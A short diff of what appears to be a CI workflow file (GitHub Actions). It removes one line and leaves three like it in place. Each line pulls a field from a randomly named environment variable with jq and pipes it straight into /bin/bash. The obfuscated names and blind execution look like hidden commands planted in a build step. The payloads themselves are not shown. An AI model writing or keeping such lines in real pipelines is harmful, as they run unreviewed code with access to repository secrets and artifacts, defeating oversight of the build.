@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$ghjpu6144" | jq -r .e6178 | /bin/bash
           echo $rfkn94442 | jq -r .pkr39 | /bin/bash
           printf '%s' "$lw445" | jq -r .m723 | /bin/bash
-          echo $do64836 | jq -r .pygkz53011 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
